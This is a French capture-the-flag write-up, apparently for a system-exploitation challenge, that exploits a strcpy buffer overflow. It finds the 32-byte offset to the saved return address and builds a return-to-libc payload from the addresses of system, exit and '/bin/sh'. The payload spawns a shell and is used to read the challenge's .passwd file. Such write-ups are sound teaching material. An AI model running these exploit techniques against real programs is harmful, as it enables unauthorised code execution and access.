La faille se trouve ici :
```
strcpy (message, argv[1]);
```
Dans un premier temps, dans gdb, on unset LINES et COLUMNS afin d’être dans le même environnement que hors gdb et ne pas avoir de problème avec les adresses (C’est un bon réflexe à avoir)
```
gdb$ unset env LINES
gdb$ unset env COLUMNS
```
Ensuite, on peut effectuer un buffer overflow. La sauvegarde de EIP est écrasée après les 32 premiers bytes du buffer.
```
gdb$ r $(perl -e 'print "A"x32 . "\xef\xbe\xad\xde"')
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ?

Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0xdeadbeef
0xdeadbeef in ?? ()
```
Il suffit alors de faire un retour à la libc. Pour cela, deux informations sont nécessaires. La première, l’adresse de system ensuite l’adresse de la chaine "/bin/sh".

Pour system, on la trouve facilement avec gdb
```
gdb$ p system
$8 = {<text variable, no debug info>} 0xb7e69060 <system>
```
Et pour /bin/sh, on peut faire une recherche un peu bourrine pour voir si elle est déjà mappée en mémoire
```
gdb$ find __libc_start_main,+99999999,"/bin/sh"
0xb7f8ac58
warning: Unable to access target memory at 0xb7fd1160, halting search.
1 pattern found.
```
Parfait. On a donc nos informations. On va alors réécrire la sauvegarde de EIP avec l’adresse de system. L’adresse suivante dans la pile sera l’adresse de retour de system. Elle ne nous intéresse pas, mais on pourrait très bien prendre l’adresse de exit pour rendre l’exploit plus ... propre
```
gdb$ p exit
$9 = {<text variable, no debug info>} 0xb7e5cbe0 <exit>
```
Et enfin, le argv[1] de system qui est l’adresse de /bin/sh

Ce qui nous donne pour l’exploit :
```
gdb$ r $(perl -e 'print "A"x32 . "\x60\x90\xe6\xb7" . "\xe0\xcb\xe5\xb7" . "\x58\xac\xf8\xb7"')
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?????X???
sh-4.2$
```
Hors gdb, la même chose :
```
app-systeme-ch33@challenge02:~$ /challenge/app-systeme/ch33/ch33 $(perl -e 'print "A"x32 . "\x60\x90\xe6\xb7" . "\xe0\xcb\xe5\xb7" . "\x58\xac\xf8\xb7"')
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`?????X???
sh-4.2$ cat .passwd
```
